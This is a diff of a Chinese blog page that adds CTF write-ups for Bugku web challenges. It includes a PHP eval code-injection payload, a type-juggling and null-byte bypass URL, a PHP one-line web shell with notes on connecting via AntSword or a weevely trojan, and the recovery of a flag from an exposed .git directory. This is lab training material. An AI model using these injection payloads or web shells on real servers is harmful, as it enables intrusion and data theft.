@@ -27,11 +27,15 @@
 <meta property="og:site_name" content="not coder">
 <meta property="og:description" content="立志ak所有靶机">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003624.png">
+<meta property="og:image" content="http://example.com/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003822.png">
+<meta property="og:image" content="http://example.com/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714122302.png">
 <meta property="article:published_time" content="2023-06-23T10:47:24.000Z">
-<meta property="article:modified_time" content="2023-07-06T15:38:29.186Z">
+<meta property="article:modified_time" content="2023-07-14T04:23:55.945Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="bugku">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003624.png">
 
 <link rel="canonical" href="http://example.com/2023/06/23/bugku/">
 
@@ -224,7 +228,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-06 23:38:29" itemprop="dateModified" datetime="2023-07-06T23:38:29+08:00">2023-07-06</time>
+                <time title="修改时间：2023-07-14 12:23:55" itemprop="dateModified" datetime="2023-07-14T12:23:55+08:00">2023-07-14</time>
               </span>
 
           <br>
@@ -233,14 +237,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>140</span>
+              <span>489</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -268,6 +272,50 @@
 <h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#101;&amp;#53;&amp;#51;&amp;#101;&amp;#52;&amp;#51;&amp;#48;&amp;#49;&amp;#56;&amp;#101;&amp;#56;&amp;#99;&amp;#101;&amp;#99;&amp;#48;&amp;#98;&amp;#102;&amp;#53;&amp;#57;&amp;#101;&amp;#49;&amp;#54;&amp;#102;&amp;#53;&amp;#52;&amp;#50;&amp;#56;&amp;#57;&amp;#50;&amp;#49;&amp;#97;&amp;#51;&amp;#125</span><br></pre></td></tr></table></figure>
 
 <p>unicode 转ascil</p>
+<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先闭合var_dump: <strong>1)”;</strong><br>第二步构建print_r：<strong>print_r(file(“.&#x2F;flag.php”));</strong></p>
+<p><strong>eval(“var_dump(1);print_r(file(“.&#x2F;flag.php”)”)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello=1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>base64解码，然后url解密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>数字与字符比较，只与数字比较，如1a&#x3D;&#x3D;1, aa&#x3D;&#x3D;0;</p>
+<p>eregi()匹配函数，匹配到则是True</p>
+<p>eregi 存在%00截断绕过 \x00</p>
+<p>$b的第一位要是4而且不是4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.67.175.224:18061/hello.php?id=ab&amp;a=php://input&amp;b=%001234567</span><br></pre></td></tr></table></figure>
+
+<p>或者使用*通配符  只要传入就可以满足啦</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b=*12345</span><br></pre></td></tr></table></figure>
+
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开，php代码混淆</p>
+<p><a target="_blank" rel="noopener" href="http://www.zhaoyuanma.com/phpjm.html">php解密加密|php混淆破解|phpjm破解|phpdp神盾破解|php威盾破解|php微盾破解|tianyiw破解|php源码破解|php在线破解|php反编译|zend6解密|Zend Guard 6 破解 (zhaoyuanma.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@eval($_POST[ymlisisisiook]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，使用插件</p>
+<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003624.png"></p>
+<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003822.png"></p>
+<p>连接即可</p>
+<p>第二种方法，使用weevely，生成一个木马上传，</p>
+<p>然后连接，即可绕过</p>
+<p>解法三：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ymlisisisiook=var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>下载网站所有文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r  http://114.67.175.224:13620/.git</span><br></pre></td></tr></table></figure>
+
+<p>cd 到文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>
+
+<p>查看所有历史版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714122302.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show 40c6d51</span><br></pre></td></tr></table></figure>
+
+<p>看到flag</p>
 
     </div>
 
@@ -306,7 +354,7 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/06/19/buu-real1/" rel="prev" title="buu-real1">
+    <a href="/2023/06/19/buu%E5%90%88%E9%9B%86-buu-real1/" rel="prev" title="buu-real1">
       <i class="fa fa-chevron-left"></i> buu-real1
     </a></div>
       <div class="post-nav-item">
@@ -371,7 +419,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">1.</span> <span class="nav-text">留言板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alert"><span class="nav-number">2.</span> <span class="nav-text">alert</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">1.</span> <span class="nav-text">留言板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alert"><span class="nav-number">2.</span> <span class="nav-text">alert</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">3.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#never-give-up"><span class="nav-number">4.</span> <span class="nav-text">never_give_up</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#source"><span class="nav-number">6.</span> <span class="nav-text">source</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -387,7 +435,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -400,7 +448,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-count">25</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -436,12 +484,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">60k</span>
+    <span title="站点总字数">62k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:38</span>
+    <span title="站点阅读时长">3:44</span>
 </div>
 
 <!--
